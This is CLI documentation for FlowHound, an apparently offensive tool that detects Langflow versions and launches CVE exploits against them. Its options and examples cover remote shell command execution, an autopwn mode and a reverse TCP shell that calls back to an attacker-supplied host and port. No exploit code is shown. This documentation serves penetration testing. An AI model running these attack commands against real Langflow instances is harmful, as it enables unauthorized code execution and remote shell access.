# CLI Overview

FlowHound exposes a single entry point, `flowhound`, with two sub-commands: [`attack`](attack.md) and [`sniff`](sniff.md).

```
flowhound [OPTIONS] COMMAND [ARGS]...
```

The top-level group accepts `-h` / `--help` as the help flag. Each sub-command inherits the same flag names.

---

## Global options

| Flag | Description |
|---|---|
| `-h`, `--help` | Show help text and exit |

---

## Commands

### `attack`

Launch one or more exploits against a Langflow instance.

```
flowhound attack --url <URL> [OPTIONS]
```

| Option | Required | Type | Description |
|---|---|---|---|
| `--url` | Yes | URL | URL of the target Langflow instance (e.g. `http://localhost:7860`) |
| `--username` | No | string | Langflow username — must be paired with `--password` |
| `--password` | No | string | Langflow password — must be paired with `--username` |
| `--autopwn` | No | flag | Run all matching exploits instead of stopping at the first success |
| `--proxy` | No | URL | HTTP(S) proxy to route all traffic through (e.g. `http://127.0.0.1:8080`) |
| `--command` | No | string | Shell command to run on the target via the `execute_bash_command` payload |
| `--reverse_shell` | No | `LHOST:LPORT` | Reverse TCP shell payload target (e.g. `192.168.1.10:4444`) |
| `-h`, `--help` | No | — | Show help text and exit |

**Constraints:**

- `--command` and `--reverse_shell` are mutually exclusive.
- `--username` and `--password` must always be supplied together.

---

### `sniff`

Detect the target Langflow version and list all applicable CVEs without launching exploits.

```
flowhound sniff --url <URL> [OPTIONS]
```

| Option | Required | Type | Description |
|---|---|---|---|
| `--url` | Yes | URL | URL of the target Langflow instance |
| `--proxy` | No | URL | HTTP(S) proxy to route all traffic through |
| `-h`, `--help` | No | — | Show help text and exit |

---

## URL validation

Both commands validate the `--url` and `--proxy` values at startup. Accepted schemes are `http` and `https`. A missing or malformed scheme causes an immediate `BadParameter` error before any network traffic is sent.

---

## Exit behaviour

| Condition | Exit code |
|---|---|
| Normal exit | `0` |
| Click usage error (bad options) | `2` |
| Runtime error (e.g. unreachable target) | `1` |

---

## Examples

```bash
# Show top-level help
flowhound --help

# Show attack help
flowhound attack --help

# Show sniff help
flowhound sniff --help

# Unauthenticated attack, stop at first success
flowhound attack --url http://target.example.com:7860

# Authenticated attack
flowhound attack --url http://target.example.com:7860 --username admin --password secret

# All exploits with a custom command payload
flowhound attack --url http://target.example.com:7860 --autopwn --command "id"

# Reverse shell
flowhound attack --url http://target.example.com:7860 --reverse_shell 192.168.1.10:4444

# Route traffic through Burp Suite
flowhound attack --url http://target.example.com:7860 --proxy http://127.0.0.1:8080

# Version detection only
flowhound sniff --url http://target.example.com:7860
```
